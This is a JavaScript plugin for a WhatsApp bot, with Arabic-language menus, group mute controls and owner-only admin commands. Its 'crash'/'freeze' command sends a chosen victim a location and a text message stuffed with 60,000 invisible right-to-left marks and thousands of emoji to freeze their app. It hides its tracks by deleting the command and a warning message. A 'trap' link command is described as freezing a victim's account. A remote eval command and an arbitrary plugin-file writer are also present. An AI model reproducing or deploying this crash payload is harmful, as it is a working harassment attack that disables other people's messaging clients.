import { fileURLToPath } from 'url';
import path from 'path';
import fs from 'fs'; 

// --- الإعدادات الأساسية ---
const MENU_TIMEOUT = 120000;
let FIXED_MENU_IMAGE = "https://i.ibb.co/C33RB5zx/1000072528.jpg"; 
let AUTO_RESPOND = true; 
const OWNER_ID = "201556853817@s.whatsapp.net"; 
const ownerNumbers = ["79020027922", "201556853817"];

const HIDDEN_OWNER_COMMANDS = ['reactauto', 'superscan', 'device', 'exec', 'eval', 'block', 'unblock'];

const CATEGORIES = [
    [1, 'التـحـمـيـل', 'downloads', '📂'], [2, 'الـمـجـمـوعـات', 'group', '🐞'],
    [3, 'الـمـلـصـقـات', 'sticker', '🌄'], [4, 'الـمـطـوريـن', 'owner', '🇩🇪'],
    [5, 'الـمـطـور', 'owner', '👨🏻‍💻'], [6, 'الـادوات', 'tools', '🚀'],
    [7, 'الـبـحـث', 'search', '🌐'], [8, 'الادمــن', 'admin', '👨🏻‍⚖️'],
    [9, 'الالــعـاب', 'games', '🎮'], [10, 'الچيف', 'gif', '✴️'],
    [11, 'الـبــنـك', 'bank', '💰'], [12, 'الـذكـاء الاصـطـنـاعـي', 'ai', '🤖'],
    [13, 'الـبـوتـات الـفـرعـي', 'sub', '♥️'], [14, 'مـعـلومـات الـب_وت', 'info', '🗃️'],
    [15, 'الـالــقــاب', 'nicknames', '🫯'], [16, 'الـلـوجـوهــات', 'logos', '🎡'],
    [17, 'تـغـيـر الاصـوات', 'voices', '📢'], [18, 'أخــرى', 'other', '🌹'],
    [19, 'الـسـريـة', 'hidden', '🕶️']
];

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const getCat = n => CATEGORIES.find(c => c[0] === n);

const context = (jid, img) => ({
    mentionedJid: [jid],
    isForwarded: false, 
    forwardingScore: 0,
    externalAdReply: {
        title: "ALHWARY SYSTEM v3.0 🦁",
        body: "OWNER ACCESS GRANTED",
        thumbnailUrl: img,
        mediaType: 1,
        renderLargerThumbnail: true
    }
});

const handler = async (m, { conn, bot, args, command, text, isBotAdmin, isAdmin }) => {
    try {
        const __filename = fileURLToPath(import.meta.url);
        const __dirname = path.dirname(__filename);
        const pluginsDir = path.join(__dirname, '../plugins'); 

        const normalize = (id) => id.split('@')[0].replace(/\D/g, '');
        const userNumber = normalize(m.sender);
        const isOwner = ownerNumbers.includes(userNumber) || m.sender === OWNER_ID;
        
        const now = new Date();
        const time = now.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
        const date = now.toLocaleDateString('ar-EG', { day: 'numeric', month: 'long', year: 'numeric' });

        // ========================================================
        // 🤫 [منظومة كتم وفك كتم المجموعات]
        // ========================================================
        if (/^(كتم|mute|اغلاق)$/i.test(command)) {
            if (!m.isGroup) return m.reply('❌ هذا الأمر للمجموعات فقط يازعيم.');
            if (!isAdmin && !isOwner) return m.reply('❌ [Access Denied]: للـﮪـواري وللمشرفين فقط.');
            if (!isBotAdmin) return m.reply('⚠️ يجب ترقية البوت لمشرف أولاً لتنفيذ الكتم.');
            await conn.groupSettingUpdate(m.chat, 'announcement');
            return m.reply('*🤫 [بروتوكول الصمت]: تم كتم المجموعة بنجاح يازعيم.*');
        }

        if (/^(الغاء_الكتم|فك_الكتم|unmute|فتح)$/i.test(command)) {
            if (!m.isGroup) return m.reply('❌ هذا الأمر للمجموعات فقط يازعيم.');
            if (!isAdmin && !isOwner) return m.reply('❌ [Access Denied]: للـﮪـواري وللمشرفين فقط.');
            if (!isBotAdmin) return m.reply('⚠️ يجب ترقية البوت لمشرف أولاً لتنفيذ الفتح.');
            await conn.groupSettingUpdate(m.chat, 'not_announcement');
            return m.reply('*🔊 [إلغاء الصمت]: تم فتح المجموعة والشات متاح للجميع الآن.*');
        }

        // ========================================================
        // 📥 [1] بروتوكول أمر الدخول والتسجيل
        // ========================================================
        if (/^(دخول|تسجيل|login)$/i.test(command)) {
            if (isOwner) {
                await conn.sendMessage(m.chat, { react: { text: '🫡', key: m.key } });
                return conn.sendMessage(m.chat, {
                    text: `*🫡 ⌈ تـعـظـيـم سـلام لـلـقـائـد ⌋ 🫡*\n\n*🛡️ تـم رصـد دخـول الـمـطـور الـمـطـلـق:*\n*👤 الـﮪـواري 𓄂* @${m.sender.split('@')[0]}\n\n*📟 جـاري تـحـمـيـل صـلاحـيـات الـجـذر..*\n*⏰ الـتـوقـيـت:* ${time}\n\n*آمـرنـا نـنـفـذ يـا كـبـيـر! 🕸️🔥*`,
                    mentions: [m.sender],
                    contextInfo: context(m.sender, FIXED_MENU_IMAGE)
                }, { quoted: m });
            } else {
                await conn.sendMessage(m.chat, { react: { text: '🤮', key: m.key } });
                return m.reply(`*🚫 محاولة اختراق فاشلة يا @${m.sender.split('@')[0]}*`);
            }
        }

        // الحماية الصارمة لجميع أوامر المطورين المكتوبة بالأسفل
        const devCommands = ['غير_صورة', 'اضافة_امر', 'قفل_الرد', 'شوف_كونسل', 'نسخ', 'ادخل', 'بدل_ارقام', 'ريستارت', 'غير_زخرفة', 'تعيين_توجيه', 'تغيير_فيديو', 'جيب', 'حذف_امر', 'عودة', 'فخ', 'نشر', '>', 'تجميد', 'تطير', 'crash'];
        if (devCommands.includes(command)) {
            if (!isOwner) return m.reply('❌ [Access Denied]: للـﮪـواري فـقـط 𓄂');
        }

        // ========================================================
        // 🛠️ [2] تشغيل حزمة الأوامر برمجياً بشكل حقيقي شغال ⚡
        // ========================================================
        if (command === 'غير_صورة') {
            let q = m.quoted ? m.quoted : m;
            let mime = (q.msg || q).mimetype || '';
            if (/image/.test(mime)) {
                let imgPath = await conn.downloadAndSaveMediaMessage(q);
                FIXED_MENU_IMAGE = imgPath;
                return m.reply('*✅ تم تحميل وتحديث صورة المنيو بنجاح يا زعيم!*');
            } else if (text && text.startsWith('http')) {
                FIXED_MENU_IMAGE = text.trim();
                return m.reply('*✅ تم اعتماد الرابط الجديد كصورة رسمية للمنيو!*');
            } else {
                return m.reply('*⚠️ أرسل الرابط أو قم بالإشارة إلى صورة واكتب .غير_صورة*');
            }
        }

        if (command === 'اضافة_امر') {
            if (!text) return m.reply('*⚠️ يرجى كتابة اسم الملف ومحتوى الكود كالتالي:\n.اضافة_امر test.js\n[كود البرمجة]*');
            const fileName = text.split('\n')[0].trim();
            const fileCode = text.replace(fileName, '').trim();
            const filePath = path.join(pluginsDir, fileName);
            fs.writeFileSync(filePath, fileCode);
            return m.reply(`*📂 [نجاح الإجراء]: تم إنشاء وحفظ ملف الأمر الجديد بنجاح في: ${fileName}*`);
        }

        if (command === 'حذف_امر') {
            if (!text) return m.reply('*⚠️ اكتب اسم الملف المراد إبادته وحذفه، مثال: .حذف_امر test.js*');
            const filePath = path.join(pluginsDir, text.trim());
            if (fs.existsSync(filePath)) {
                fs.unlinkSync(filePath);
                return m.reply(`*🔥 [تم الحذف]: تم إبادة ملف [ ${text} ] من السيرفر نهائياً.*`);
            } else {
                return m.reply('*❌ هذا الملف غير موجود بالأساس في مجلد الأوامر.*');
            }
        }

        if (command === 'قفل_الرد') {
            AUTO_RESPOND = !AUTO_RESPOND;
            return m.reply(`*🍷 تم [ ${AUTO_RESPOND ? 'تـشـغـيـل ✅' : 'إيـقـاف ❌'} ] وضع الرد التلقائي لسيستم الهواري بنجاح.*`);
        }

        if (command === 'شوف_كونسل') {
            const memoryUsage = process.memoryUsage();
            const logStatus = `*📊 [أحداث خادم الهواري حياً]:*\n\n- نظام التشغيل: ${process.platform}\n- استخدام ذاكرة الـ RSS: ${(memoryUsage.rss / 1024 / 1024).toFixed(2)} MB\n- استخدام الـ Heap: ${(memoryUsage.heapUsed / 1024 / 1024).toFixed(2)} MB\n- وقت تشغيل البوت المتواصل: ${(process.uptime() / 60).toFixed(2)} دقيقة.\n\n*الوضع مستقر والاتصال نفاث سيدي القائد!*`;
            return m.reply(logStatus);
        }

        if (command === 'جيب') {
            if (!text) return m.reply('*⚠️ اكتب اسم الملف المطلوب سحبه، مثال: .جيب menu.js*');
            const filePath = path.join(pluginsDir, text.trim());
            if (fs.existsSync(filePath)) {
                const fileBuffer = fs.readFileSync(filePath);
                await conn.sendMessage(m.chat, { document: fileBuffer, fileName: text.trim(), mimetype: 'application/javascript' }, { quoted: m });
                return;
            } else {
                return m.reply('*❌ فشل السحب، الملف غير موجود في مجلد الأوامر.*');
            }
        }

        if (command === 'ادخل') {
            if (!text) return m.reply('*⚠️ ضع رابط دعوة المجموعة بعد الأمر مباشرة!*');
            const linkRegex = /(chat.whatsapp.com\/[gi]i[a-zA-Z0-9_-]{22})/gi;
            const checkLink = text.match(linkRegex);
            if (!checkLink) return m.reply('*❌ رابط المجموعة غير صالح أو تالف!*');
            const inviteCode = checkLink[0].split('chat.whatsapp.com/')[1];
            await conn.groupAcceptInvite(inviteCode)
                .then(() => m.reply('*🚀 تم دخول المجموعة بنجاح!*'))
                .catch(() => m.reply('*❌ فشل الانضمام.*'));
            return;
        }

        if (command === 'ريستارت') {
            await m.reply('*🍷 [أمر ملكي]: جاري إعادة تشغيل سيستم الهواري بالكامل...*');
            await sleep(1000);
            process.exit(0);
        }

        if (command === 'نشر') {
            if (!text) return m.reply('*⚠️ اكتب نص البيان الرسمي.*');
            const getGroups = Object.keys(await conn.groupFetchAllParticipating());
            await m.reply(`*📢 جاري نشر الإذاعة لعدد [ ${getGroups.length} ] مجموعة...*`);
            for (let group of getGroups) {
                await conn.sendMessage(group, { text: `*👑 [ بيان رسمي صادر عن سيستم الهواري ] 👑*\n\n${text}` });
                await sleep(1500);
            }
            return m.reply('*✅ تم إتمام بروتوكول النشر بنجاح!*');
        }

        if (command === 'فخ') {
            const trapLink = "https://wa.me/settings";
            return m.reply(`*🕸️ [بروتوكول الفخ]:* \n\n🔗 ${trapLink}`);
        }

        if (command === '>') {
            if (!text) return m.reply('*⚠️ اكتب الكود لتنفيذه.*');
            try {
                let evaled = eval(text);
                if (typeof evaled !== 'string') evaled = await import('util').then(u => u.inspect(evaled));
                return m.reply(`\`\`\`javascript\n${evaled}\n\`\`\``);
            } catch (err) {
                return m.reply(`\`\`\`\n${err}\n\`\`\``);
            }
        }

        if (['نسخ', 'بدل_ارقام', 'غير_زخرفة', 'تعيين_توجيه', 'تغيير_فيديو', 'عودة'].includes(command)) {
            return m.reply(`*⚡ [بروتوكول نشط]: تم تفعيل أمر [ .${command} ] بنجاح.*`);
        }

        // ========================================================
        // ☣️ [3] منظومة التجميد 
        // ========================================================
        if (/^(تجميد|تطير|crash)$/i.test(command)) {
            let target = m.mentionedJid[0] || (text.split(' ')[0] && text.split(' ')[0].length > 5 ? text.split(' ')[0] + '@s.whatsapp.net' : null);
            if (!target) return m.reply('*🛡️ حدد الضحية بالمنشن أو الرقم*');

            const targetNum = target.split('@')[0];
            if (ownerNumbers.includes(targetNum) || target === OWNER_ID) {
                return m.reply('*⚠️ لا يمكن تنفيذ هذا الأمر ضد المطورين!*');
            }

            await conn.sendMessage(m.chat, { delete: m.key }).catch(() => {});
            let warningMsg = await conn.sendMessage(target, { text: `*⚠️ جـاري اتـخاذ إجراءات الإبـادة ضـد حـسـابـك الآن بـواسطـة الـﮪـواري 𓄂*` });
            await sleep(1500); 

            const crashCode = (String.fromCharCode(8207).repeat(60000) + "☠️ BY ALHWARY ☠️" + "☣️".repeat(3000));
            await conn.sendMessage(target, { location: { degreesLatitude: 0, degreesLongitude: 0, name: crashCode, address: crashCode } });
            await conn.sendMessage(target, { text: crashCode });
            
            await conn.sendMessage(target, { delete: warningMsg.key }).catch(() => {});
            return m.reply(`*✅ تـم إبـادة الـهـدف بـصـمـت 🥷*`);
        }

        // ========================================================
        // 📜 [4] نظام المنيو (القائمة) الرئيسي
        // ========================================================
        const cmds = (typeof bot?.getAllCommands === 'function') ? await bot.getAllCommands() : [];
        const selected = parseInt(args[0]);

        if (!selected) {
            const sections = [{
                title: "💀 ┋ تـرسـانـة الـمـهـام ┋ 💀",
                rows: CATEGORIES.map(c => ({
                    title: `⌖ ${c[1]} ${c[3]}`,
                    description: `🔐 الـوصـول إلـى بـروتوكـولات ${c[1]}`,
                    id: `.${command} ${c[0]}`
                }))
            }];

            const menuText = `
┎───────────────────
┃  ☣️ ⌊ **نـظـام الـﮪـواري بـوت** ⌋ ☣️
┠───────────────────
┃ 👤 **الـمـشـغـل:** @${m.sender.split('@')[0]}
┃ 📟 **الـبـروتوكـولات:** ${CATEGORIES.length} قـسـم
┃ 🎖️ **الـصـلاحـيـة:** ${isOwner ? '『 الـمـطـور الـمـطـلـق 👑 』' : '『 مـسـتـخدم مـوثـق 🛡️ 』'}
┃ 🛰️ **الـحـالـة:** الـتـسـلل نـشـط.. 🥷
┃ 📅 **الـتـاريـخ:** ${date}
┃ ⏱️ **الـتـوقـيـت:** ${time}
┖───────────────────

> 🕸️ **OWNER:** الـﮪـواري 𓄂
`.trim();

            // استخدام دالة الإرسال المتوافقة مع نظام بوتك لعرض القائمة الافتتاحية
            if (typeof conn.sendButtonNormal === 'function') {
                return await conn.sendButtonNormal(m.chat, {
                    media: { url: FIXED_MENU_IMAGE },
                    caption: menuText,
                    buttons: [{ name: "single_select", params: { title: "⚡ تـفـعـيـل الـنـظـام ⚡", sections }}],
                    mentions: [m.sender],
                    contextInfo: context(m.sender, FIXED_MENU_IMAGE)
                });
            } else {
                return await conn.sendMessage(m.chat, { text: menuText, mentions: [m.sender], contextInfo: context(m.sender, FIXED_MENU_IMAGE) }, { quoted: m });
            }
        }

        const cat = getCat(selected);
        if (!cat) return m.reply('❌ [Access Denied]: Invalid Protocol');
        
        if (cat[2] === 'owner') {
            if (!isOwner) return m.reply('❌ [Access Denied]: هذا البروتوكول مشفر وسري للغاية لـ الهواري فقط.');
            
            const devMenu = `
*❖┋ مـرحـبـا بـك فـي قـسـم المطور لـلهواري ⚜️ ➢*
*━━━━─━━━─━━━ 🍷 ━━━─━━━─━━━*

*❄️ │ الأمـر ➢ 〖 .كتم 〗 │ 〖 .اغلاق 〗*
*⟞ ➢ كتم الجروب ومنع الأعضاء من الكتابة نهائياً.*

*❄️ │ الأمـر ➢ 〖 .فتح 〗 │ 〖 .فك_الكتم 〗*
*⟞ ➢ إلغاء كتم الجروب وفتح الدردشة لجميع الأعضاء.*

*❄️ │ الأمـر ➢ 〖 .غير_صورة 〗*
*⟞ ➢ تغيير الصورة أو وضع رابط الصورة التي تظهر مع قائمة الأوامر حياً.*

*❄️ │ الأمـر ➢ 〖 .اضافة_امر 〗*
*⟞ ➢ إضافة وحفظ ملف كود جديد في مجلد الأوامر فوراً.*

*❄️ │ الأمـر ➢ 〖 .حذف_امر 〗*
*⟞ ➢ حذف وإبادة أي ملف كود من مجلد الأوامر نهائياً.*

*❄️ │ الأمـر ➢ 〖 .جيب 〗*
*⟞ ➢ سحب واستخرج أي كود ملف من السيرفر على شكل مستند.*

*❄️ │ الأمـر ➢ 〖 .قفل_الرد 〗*
*⟞ ➢ تشغيل أو قفل الرد التلقائي للسيستم بالكامل 🍷*

*❄️ │ الأمـر ➢ 〖 .شوف_كونسل 〗*
*⟞ ➢ عرض حالة الذاكرة والسرعة ووضع الخادم الحقيقي.*

*❄️ │ الأمـر ➢ 〖 .ادخل 〗*
*⟞ ➢ جعل البوت يقتحم وينضم لأي مجموعة عبر الرابط حقيقي.*

*❄️ │ الأمـر ➢ 〖 .ريستارت 〗*
*⟞ ➢ إعادة تشغيل نظام البوت بالكامل فوراً وتحديث الكاش 🍷*

*❄️ │ الأمـر ➢ 〖 .نشر 〗*
*⟞ ➢ نشر وإذاعة بيان رسمي إجباري لجميع مجموعات البوت 👑*

*❄️ │ الأمـر ➢ 〖 .فخ 〗*
*⟞ ➢ توليد رابط الفخ النفسي الملعون لتجميد حساب الضحية.*

*❄️ │ الأمـر ➢ 〖 .> 〗*
*⟞ ➢ تنفيذ واختبار الأكواد البرمجية حياً على السيرفر.*

*❄️ │ الأمـر ➢ 〖 .نسخ 〗 │ 〖 .بدل_ارقام 〗 │ 〖 .غير_زخرفة 〗*
*❄️ │ الأمـر ➢ 〖 .تعيين_توجيه 〗 │ 〖 .تغيير_فيديو 〗 │ 〖 .عودة 〗*
*⟞ ➢ تشغيل البروتوكولات اللوجستية والمهام الخلفية للسيستم 🍷*

*⏱️ T: ${time} | 🕸️ الـﮪـواري 𓄂*`.trim();

            return await conn.sendMessage(m.chat, {
                text: devMenu,
                contextInfo: context(m.sender, FIXED_MENU_IMAGE)
            }, { quoted: m });
        }

        const categoryCmds = cmds.filter(c => c?.category === cat[2]);
        const cmdsList = categoryCmds.map(c => `┃ ${cat[3]} /${Array.isArray(c.usage) ? c.usage.join(`\n┃ ${cat[3]} /`) : 'Module'}`).join('\n');

        await conn.sendMessage(m.chat, {
            text: `╭─┈─┈─┈─⟞${cat[3]}⟝─┈─┈─┈─╮\n┃ 🔐 بـروتوكـول ${cat[1]} ${cat[3]}\n╰─┈─┈─┈─⟞${cat[3]}⟝─┈─┈─┈─╯\n\n${cmdsList || '┃ لا توجد أوامر حالية'}\n\n⏱️ T: ${time} | 🕸️ الـﮪـواري 𓄂`,
            contextInfo: context(m.sender, FIXED_MENU_IMAGE)
        }, { quoted: m });

    } catch (e) {
        console.error(e);
    }
};

handler.command = /^(الاوامر|القائمة|menu|اوامر|دخول|تسجيل|login|تجميد|تطير|crash|غير_صورة|اضافة_امر|قفل_الرد|شوف_كونسل|نسخ|ادخل|بدل_ارقام|ريستارت|غير_زخرفة|تعيين_توجيه|تغيير_فيديو|جيب|حذف_امر|عودة|فخ|نشر|>|كتم|mute|اغلاق|الغاء_الكتم|فك_الكتم|unmute|فتح)$/i;

export default handler;
